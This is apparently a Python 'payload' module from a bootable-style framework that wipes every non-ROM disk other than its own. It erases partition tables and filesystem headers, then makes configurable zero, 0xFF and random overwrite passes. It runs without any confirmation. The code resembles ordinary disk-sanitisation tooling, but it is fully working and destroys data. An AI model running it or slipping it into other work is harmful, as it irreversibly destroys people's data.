#!/usr/bin/python3
"""
Wipe_disks payload
"""
import random

from snr.core.payload import entry_point, storage
from snr.core.util import common_utils

WIPE_MODE = "@WIPE_MODE@"
MODE_E_RANDOM_PASSES = 5


def pass_zero(path: str, kbs: int) -> None:
    with open(path, "wb") as stream:
        for _ in range(kbs):
            stream.write(b'\0' * 1024)
            stream.flush()


def pass_ff(path: str, kbs: int) -> None:
    with open(path, "wb") as stream:
        for _ in range(kbs):
            stream.write(b'\xFF' * 1024)
            stream.flush()


def pass_random(path: str, kbs: int) -> None:
    with open(path, "wb") as stream:
        for _ in range(kbs):
            stream.write(random.randbytes(1024))
            stream.flush()


@entry_point.entry_point
def main() -> None:
    block_info, _, our_device = storage.setup()
    common_utils.print_info("Wipe_disks payload started")
    wipe_level = ord(WIPE_MODE) - ord("A")

    for block in block_info:
        if block != our_device and not block.is_rom():
            common_utils.print_info(f"Targeting {block.path}")
            # Level 0: All levels have this
            # No matter the mode, we must override the partition table header and filesystem header
            for child in block.children:
                common_utils.print_info(
                    f"Wiping filesystem info on {child.path}")
                pass_zero(child.path, 1024)
            common_utils.print_info(f"Wiping partition table on {block.path}")
            pass_zero(block.path, 1024)
            if wipe_level >= 1:
                common_utils.print_info(f"Doing a zero pass on {block.path}")
                pass_zero(block.path, block.size // 1024)
            if wipe_level >= 2:
                common_utils.print_info(f"Doing a 0xFF pass on {block.path}")
                pass_ff(block.path, block.size // 1024)
            if wipe_level >= 3:
                common_utils.print_info(f"Doing a random pass on {block.path}")
                pass_random(block.path, block.size // 1024)
            if wipe_level >= 4:
                for _ in range(MODE_E_RANDOM_PASSES-1):
                    common_utils.print_info(
                        f"Doing a random pass on {block.path}")
                    pass_random(block.path, block.size // 1024)
    common_utils.print_ok("Wipe_disks payload completed")


if __name__ == "__main__":
    main()
